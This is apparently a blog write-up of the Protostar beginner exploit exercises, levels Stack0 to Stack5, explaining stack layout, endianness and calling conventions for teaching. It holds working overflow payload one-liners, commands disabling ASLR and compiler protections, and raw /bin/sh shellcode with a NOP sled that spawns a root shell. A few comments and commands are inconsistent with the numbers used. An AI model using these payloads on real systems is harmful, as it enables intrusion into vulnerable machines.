---
layout: default
title:  "Exploit-Exercises: Protostar - Stack Levels"
categories: test
---

This is one of the great exploit exercises at [exploit-exercises.com](https://exploit-exercises.com/protostar/stack0/).  
Protostar one is an exploit exercise at the beginner level. It features binary exploitation in **32bit with disabled ASLR and NX**.

I've solved this game a long time ago, and found it quite nice for beginners. I think it is worth a first writeup for explaining and rethinking the basics.

The exploits here are written in python (where usefull) using [pwntools](https://exploit-exercises.com). Pwntools provide nice utilies which automates some repetetive tasks often used during [CTF's](https://ctftime.org/). I will show how exploiting will work with and without those goodies. Each time I am using something of the framework for the first time I'll give a short introduction.

Second, I will use [pwndbg](https://github.com/pwndbg/pwndbg). It's a replacement for [gdb-peda](https://github.com/longld/peda) and makes debugging in gdb a lot more confortable.

> Instead of using the provided image, you can compile the code snippets yourself. Because modern systems are using 64bit and some protection mechanism which make it harder to explain basic exploitation, we will need do disable them. Also keep in mind, that offsets used here might not work on the provided image.

---

Introduction - Compile the code
===============================

Modern system are using the following protections on you systems which needs to be turned off to show the basic exploitation technics used in protostar.

 - **DEP - Data execution prevention / NX - Non Executeable bit.**<br/>
   In older days, every memory region was executeable. User input often goes to the stack, so providing the shellcode as part of the input and get it executed directly on the stack was common. Nowadays the memory regions are writeable or executeable. But not both at the same time.

 - **ASLR - Address Space Layout Randomization**<br/>
   This randomizes parts of your memory reagion. Because you programm sees virtual memory reagions and not absolut physical addresses, it was possible to know a lot about where which librarys were loaded. Also it was possible to know exactly where the stack starts, thus guessing addesses of (input) data on the stack was easy.

 - **Stack canaries**<br/>
   Sesitive data on the stack like return addresses form function calls can be  protected by enclosing them whith well known random values. If a function returns, it will check if those values are modified or not, thus detectinig those modifications to the programm flow.

 - **64bit uses cpu-registers for function parameters**<br/>
   This is not a protection itself. But it's one of the things that makes exploiting 64bit a bit harder than 32bit. For the lessons here we will use 32bit addresses and parameters to functions should be on the stack.

 - **4byte Stack boundry**<br/>
   This is also not a protection. By default gcc compiles code in a way that data on the stack is aligned at 16byte boundries (4 words / 64bit). To make calculations a bit easier we will align at 4bytes = 1 word = 32bit.

To compile 32bit code without those protection, use the following options to gcc (-g is used to keep debugging symbols, which makes it easier to debug it with tools like gdb):

```bash
gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -g -o foo foo.c
```

To turn of ASLR, set the following sysctrl as root before running the binary
```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

---

Stack0
======

Grab the code at [https://exploit-exercises.com/protostar/stack0/](https://exploit-exercises.com/protostar/stack0/).
You will easily notice, that the goal of this first level is to modify the variable `modified`.

Local variables on the stack
----------------------------
Local variables defined in functions are stored on the stack. The stack itself grows towards **lower** addresses. This is the opposite as strings/buffers grow in memory!  
You will notice, that if you write towards the end of the buffer you will overwrite elements put on the stack earlier.  
If you have multiple local variables they will be put on the stack in the same order in which they are defined. This means that variables defined first will put on lower addresses than varibales defined later. When not used carefully, you can ooverwrite former defined variables by writing over the boundries of latter definied ones.


Overwrite variables
-------------------
The function `main` has two local variables (at least on x86). So the stack looks like the following:

```none
< higher memory addresses >

[ modified  (32bit)     ] <- First element
[ buffer (bytes 60 -64) ] <- Second element, end of buffer
[ ...                   ]
[ buffer (bytes 1 -4)   ] <- Second element, start of buffer

<lower memory addresses>
```
User input is read on line 11 and stored in `buffer`. The function `gets()` does no length check, so if we provide more input than there is free space in buffer, all bytes after byte 64 are written outside our variable, thus overwriting everything that is stored at higher memory regions. In this case, this is exactly what we need. The variable `modified` is defined first in the main function, thus stored at a higher memory address than buffer. So writing over the bounds of buffer means writing to `modified` - level solved, lets try it.

Compile the code and provide more than 64 bytes of input:
```bash
> gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o stack0 stack0.c
> python -c print 'A'*65 | ./stack0
you have changed the 'modified' variable
```
Done!

---

Stack2
======

Grab the code: [https://exploit-exercises.com/protostar/stack2/](https://exploit-exercises.com/protostar/stack2/).
You will need to overwrite `modified` with a specific value, input is provided by an environment variable.

Endieness matters
-----------------
Computers store words in memory. On intel 32bit architectures this word is 32bit in length, meaning 4 characters. If you write characters in a buffer they get written in order from the lowest address in the buffer to the upper addresses. But if you read it as an 32bit integer value, it is not nessesarily interpreted in the same way!  
The interpretation of integer values is specified by the [endianess](https://en.wikipedia.org/wiki/Endianness) of the platform. The endianess describes, whether the **most significant byte** of a 32bit value is stored on the lowest (little endian) or highest (big endian) address of a word. This means, the 32bit value 0x11223344 is stored bytewise as 0x44 0x33 0x22 0x11 on little endian, with 0x44 is byte 4 not byte 1 as the character representation suggests.

Writing specific integer values
-------------------------------
This level is solved in the same way. This time, the overflow occurs while reading an environment variable instead of user input. Also we need to modify the overridden variable to an exact value (`0x0d0a0d0a`). To get this solved, remember the endieness. On x86 when writing bytes to buffer, they will be stored in the opposite order than inputted (little endian).

Example for the input "12345678":
```none
  | <- Higher Address
[ 0x08 0x07 0x06 0x05 ]
[ 0x04 0x03 0x02 0x01 ]
     Lower Address >|
```
So the input provided needs to be `64*Garbage + 0x0a + 0x0b + 0x0a + 0x0b`.
Let's compile an try:
```bash
> gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o stack2 stack2.c
> export GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
> ./main
you have correctly modified the variable
```

---

Stack3
======

Grab the code: [https://exploit-exercises.com/protostar/stack3/](https://exploit-exercises.com/protostar/stack3/)

A pointer in C is nothing more than a variable, holding a memory location. In addion we need to tell the compiler about how we want to use is. In stack3 we have such a definitian in line 13 and we let the function point to memory location zero in line 16 (thus pointing not to some code). So our goal ist to modify `fp` to point to the address of the `win()` function so that `whin()` will be called in line 22. When loading a binary, you get virtual memory allocated. From the view of the process, this virtual memory always looks the same. You have fixed locations for start of the stack, fixed location on where all shared libraries get loaded, fixed locations for the start of the heap and so on. On each run of the binary all functions and external libraries get loaded to the same address (at least, if you do not have ASLR enabled!).
You can get a map of all those memory regions by using `objdump`. If we have found the location for the `win()` function, we can simply overflow `buffer` thus writing the address to `fp`. Remember, that you have to input the bytes of the address in opposite order.
```bash
> echo 0 > /proc/sys/kernel/randomize_va_space
> gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o stack3 stack3.c
> objdump -t stack3 | grep win
08048480 g F .text 00000014 win
> python -c 'print "A"*64+"\x80\x84\x04\x08"' | ./main
code flow successfully changed
```

The extraction of the address for the function `win()` can also be solved easily with `pwntools`. The following code snipped will prepare the exploit-string for you. `p32()` is a handy function to get the address in the correct endianess. When not using pwntools you can use `struct.pack('<P', 0x08048480)` instead.

```python
#!/usr/bin/python

import struct
from pwn import *

e = ELF('./stack3')
win=e.symbols['win']

# print "A"*64+struct.pack('&lt;I', win)
print "A"*64+p32(win)
```

---

Stack4
======

CDECL - Function Calling Convention
-----------------------------------

First, we need some introduction on how functions are called to get an idea, on how can be able to influence the program flow.
Function calling on c-compiled linux binaries is following the `cdecl` calling convention. Let's have a look at the different cpu-registers involved in running a program.

- At first you have `EIP`. This one points to the instruction that
   should be executed.
- Then you have `EBP`. This is the base pointer of
   the stack (pointer to the first element of the current **stack
   frame**.
- And you have `ESP`, this points to the next free address on
   the stack.

The stack follows the concept of frames. So `EBP` does not point to the very base address of the whole stack, but to the the base of the current frame. A frame is created every time a function is being called.
If you call a function, three things need to happen. First you will need to remember where to continue when the function exists. Second, you have to create a new stack frame. This is simply done by setting `EBP` to a new value. This also means that you have to remember where the old stack frame starts (to restore `EBP` on function exit).

This tasks are solved in a very simple way. On function calling, the calling function saves the old <code class="json">EIP</code> to the stack. The called function pushes the old <code class="json">EBP</code> on the stack and sets it to the value of <code class="json">ESP</code>, thus "creating" a new stack frame. Then it reserves space for all local variables. The stack now shows: saved EIP, old ESP, local variables. The ESP points directly after the saved EIP.

On exit, the `old ESP` is restored from the current `EBP` (the base pointer, remember this points to the first element on the new frame where we have stored the old `ESP` previously) and afterwards we pop `EIP` from the stack (meaning: the values that `ESP` points to is saved in `EIP`, which is the old `EIP` which was saved by that calling function)

The two thinks are mostly done by the instructions `call` and `ret`.
A `call` is implicit a two operation thing. `EIP` is not directly accessible, so keep in mind the following description, even that it will not work in praxis.
```nasm
; call is equal to
push %eip  ; save eip to the stack
jmp addr   ; set eip to the address of the called function
```
The `ret` instruction also does multiple things.
```nasm
; ret is equal to
mv %esp, %ebp  ; set the stack pointer to the base pointer
               ; (esp now points to the first element (the saved ebp)
               ; of the current frame of win())
pop %ebp       ; pop one element from the stack into ebp
               ; (this restores the old ebp, and "trashes" the frame of win())
pop %eip       ; pop one element from the stack into eip
               ; (this restores the old eip, the programm will continue in main())
```

Let's see this in action:

C-Code
```c
#include 

void win() {
  int var1;
  char buff[64];
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv) {
  win();
}
```

Object-Code:
```nasm
08048434 :  <main>:
 ... start of main() ...
 804843a:       e8 e1 ff ff ff          call   8048420        ; call win()
                                                              ; (push %eip; jmp 0x8048420)

08048420 : <win>:
 8048420:       55                      push   %ebp           ; save EBP
 8048421:       89 e5                   mov    %esp,%ebp      ; set EBP to ESP
 8048423:       83 ec 18                sub    $0x58,%esp     ; reserve space for local variables
 ... body of win() ...
 8048433:       c3                      ret                   ; return to main()
                                                              ; (mv %esp, %ebp; pop %ebp; pop %eip)
```

Stack when inside win():

```none
<high memory address>
              [ ... stuff before main ...       ]
main's EBP:   [ ... stuff from main ...         ] \
              [ ... local variables of main ... ]  }- Stackframe of main()
              [ saved EIP                       ] /
EBP:          [ saved EBP (main's EBP)          ] \
              [ var1                            ]  \
              [ buff (bytes 60-64)              ]   }- Stackframe of win()
              [ ...                             ]  /
ESP:          [ buff (bytes 1 -4)               ] /
<lower memory address>
```

Ok, let's have a look at the `buff` variable created inside `win()`. What happens, if we write more than 64 bytes to it? Exactly, we override `var1`. And than? we override the `saved EBP` and afterwards the `saved EIP`. And what happens when `win()` exits? The code execution will continue at the `stored EIP` which we have just overwritten with a chosen value, thus we control what will be executed!

What is not said: Not only the function win() creates such a "frame" with a `stored EBP` and a `stored EIP` before, also main() is just a function which looks exactly the same in memory! This means, a `ret()` from main also pops `EBP` and `EIP`. But for the first understanding it was easier to explain it with an additional function.

Now Back to stack4:
-------------------

Grab the code: [https://exploit-exercises.com/protostar/stack4/](https://exploit-exercises.com/protostar/stack4/)

You see that you can overflow our old friend `buffer`. We now know that overflowing `buffer` leads to an overwritten `EBP` (the first thing that is stored before the local variables) and afterwards it overwrites the saved `EIP` which was put on the stack before `main()` was called. Our goal is to call the `win()` function. So we need to manage to  put the address of `win()` in the place where the `saved EIP` was saved. When `main()` returns, this address will become `EIP` and the program execution continues there, thus running the `win()` function.

All we need to do is:
- Getting the address of win() using `objdump -t` or `pwntools`.
- Overflowing `buffer` (64bytes) and the saved `EBP` (additional 4bytes) with garbage
- continue overflowing. This time the `saved EIP` (4bytes) with the address gathered previously
- win!

```bash
> echo 0 > /proc/sys/kernel/randomize_va_space
> gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o stack4 stack4.c
> objdump -t stack4 | grep win
08048480 g F .text 00000014 win
> python -c 'print "A"*64+"BBBB"+"\x80\x84\x04\x08"' | ./main
code flow successfully changed
Segmentation fault
```

Why does it segfault? This is simply the case, because when returning from `win()` whatever address is at `EBP+4` will be used for the next instruction. This is mostly an address which will not point on something useful.

**Homework:** As I said n the introduction, stack alignment is normally at 64bit (16bytes). This is also true for storing `EBP`! Recompile the code without `-mprefered-stack-boundry=2` and try to exploit it again.

---

Stack5
======

The next trick is to execute code, that we can provide by ourself - for example as part of our input (remember the A's we used to inject?). This code is called shellcode, because very often this code simply spawns a shell.
Programms, which are getting their input from stdin and write to stdout can be controlled very easily (it does no matter, if it's a read from a filedescriptor describing stdin or a descriptor describing a network socket - so the same works for networked processes - think about it!). You just have to execute `/bin/sh` somehow. The resulting shell will inherit stdin and stdout and will normaly be useable.

So eveything we need is a small piece of code that will start `/bin/sh` - let's call it our shellcode, add it to our input, know where those input will be stored in memory (in our case it's stored in the variable `buffer`, so we simply need it's address) and override `EIP` with this address. On `ret()` the programm jumps to our provided code and executes it - meaning, a shell will be started which we have full control about! Nice, isn't it?
For now, grab a shellcode from the net. A very simple one can be found here: [http://shell-storm.org/shellcode/files/shellcode-827.php](http://shell-storm.org/shellcode/files/shellcode-827.php). But it's even more simple to use one generated by `pwntools` as we will see in short.

The next thing is, that we wan't our stdin and stdout stay connected. When running sth. like `echo 'foo' | ./stack4` the stdin closes just after foo is feeded to stack4 and even if we manage to get a shell spawned, it will exit because of the closed `stdin`. Keeping `stdin` open can easily be solved by using cat. So we should use `{ echo 'foo'; cat -; } | ./stack4` instead. It first feed 'foo' to stack4, afterwards it continues to read from stdin. Try it by running `{ echo 'uname -r';  echo 'whoami'; cat -; } | /bin/sh`. But for such things we also have nice helpers in `pwntools`.
So now we need to know where our shellcode will be placed in memory. It's on the stack, we know its the second thing in the current stackframe (first thing is the `saved EBP`) and because the stack grows from high addresses to low addresses we know it ends at `EBP-4`. We also know it's 64bytes in length so it will start at `EBP-68`. But what is the base address of our stackframe?

One thing that was mentioned already is, that linux (at least without ASLR and on 32bit days) has a fixed virutal memory layout.

> On each run all functions will be loaded on the same addresses and the stack will always start on the same address. This address is normaly `0xC0000000`. But our program does not start at `main()`. There is a lot happening before. But you might think, when the programm goes through the same instructions on each run, **our `EBP` and also our variable should be at the same address each time the program runs. This is true, but it has to be run _exactly_ the same way!**

For example environment variables will be stored on the stack before everything that happens in `main()`. The same is true for parameters provided to the programm (beware of `argv[0]` - the first paramter whch is always provided to a programm - it is the path to the binary itself. Is it given relative (./stack4) or absolute?). All those tiny bits will influence the address of our variable.

> When running our program in gdb, the environmentvariables will be different and the path to the compiled programm is always given absolute! Gdb introduces environment variables (at least `LINES` and `COLUMNS`) that might not be there when running outside of gdb. Because this, you will fail when gathering the address of a variable by debugging the programm and than simply use this address outside of gdb! One solution is, to get the address from core-dumps as we will se next.

There is also another aproach which helps a lot when you are not able know the exact address of variables on memory: Our friend is an instruction called nop. This instruction is one byte in length and does nothing. if we **prepend our shellcode with a lot of nop's, we do not need to be very accurate on the address to our shellcode**. We just need to point somewhere in the nop-sled. This is also very handy when exploiting systems, that we cannot analyse beforehand.

Let's start
------------
- compile the code as usual (use "-g"!)
- enable creation of core-dumps: ulimit -c unlimited
- Start the programm an let it crash: `python -c 'A'*72 | ./stack5`
- Start gdb with the core dump: `gdb core.XXXX`
- Get the address of the variable buffer: `print &buffer`

Our buffer is 64 bytes and for me it's at `0xffffd0d8`. We have a shellcode that is 23 bytes. We need additional 4 bytes for the address with which we will override EIP. We need to write 72 bytes (`len(buffer) + saved EBP + saved EIP`). So we have 45bytes left for the nop-sled. Nop has the op-code `0x90` and is only one byte long. Because we assume we do not know the exact position of our shellcode, jump somewher in the middle. So lets add 22 to `0xffffd0d8` (This is `0xffffd0ee`).

```bash
$ # NOP*28 + shellcode + return Address
$ python -c 'print "\x90"*45+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xee\xd0\xff\xff"' &gt; xploit.txt
$ echo "" # This sets $_ to ""
$ { cat xploit.txt; cat -; } | `pwd`/stack5
Illegal instruction
```

As you will notice, you will get an illegal instruction.  But what happens here. Lets have a look at the memory layout at the point before and after main is exiting:

1) Before main() returns:
```none
HIGH MEMORY ADDRESS

       &lt; -before overflow  -&gt;&lt;- after overflow -&gt;
       [ old EIP            ] &lt;- Address of buff 
EBP -&gt; [ old EBP            ] \
       [ buffer bytes 60-64 ]  |
       [ ...                ]  &gt; Shellcode
       [ buffer bytes 1 -4  ] /
ESP -&gt; [ unassigned entry   ] 

LOW MEMORY ADDRESS
```

2) ret is beeing run
* ESP is set to EBP
* one stack element gets popped in EBP
* one stack element gets popped in EIP

3) After main() returns:
```none
HIGH MEMORY ADDRESS

ESP -> [ old EIP            ]
       [ old ESP            ] \
       [ buffer bytes 60-64 ]  |
       [ ...                ]  > Shellcode
EIP -> [ buffer bytes 1 -4  ] /

LOW MEMORY ADDRESS
```

Now our shellcode get's executed. But during execution it will push elements on the stack. And as you can see, `ESP` points before our shellcode. So the first push overrides the place we previously the old `EIP` was stored - nothing will happen. But the next push will override the end of our shellcode! When the execution reaches this position you will most likely get an illegal instruction.
Go and have a look how many push operations are done by our shellcode. It's going to be 5 times. So lets reserve space at the end of the buffer and try again. Of cause we need to substract the amound of chars reserved from our nop-sled and recalculate the middel of the sled to jump correctly.

```bash
$ # NOP*28 + shellcode + return Address
$ xploit=`python -c 'print "\x90"*29+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"AAAA"*4+"\xe7\xd0\xff\xff"'`
$ echo "Current process id is $$ and I am `whoami`"
Current process id is 30727 and I am &lt;user&gt;
$ { echo -e "$xploit"; echo "echo Process id now is $$ and I am \`whoami\`"; cat -; } | ./stack5
# Enter whatever you like, you will have a root shell now.
```


64 bytes is not very much for a nop-sled and might seam a bit odd (and yes it is!). In our example we have no boundry on the input. So we could have inputed 500 charactes instead of 72. What would have happended, if we wrote the nops and the shelcode starting at byte 72? In this case our shellcode would have landed somewhere in the previous frames before main(). This also means, that we would not had the problem with the self overwrites and we could even been even more inaccurate when guessing the right address "somewhere within the nop-sled". This is quite nice, multiplies the chance of a success and makes real use of the nop-sled! Stack starts at 0xffffe000, so with this much nops and such a short programm, you can guess the compleate address to "somewhere in the nop-sled". But offen you have a limited buffer and you would not have learned what those illegeal instructions come from.

  [1]: https://exploit-exercises.com/protostar/stack0/
  [2]: https://exploit-exercises.com/protostar/stack2/
  [3]: https://en.wikipedia.org/wiki/Endianness
  [4]: https://exploit-exercises.com/protostar/stack3/
  [5]: https://exploit-exercises.com/protostar/stack4/
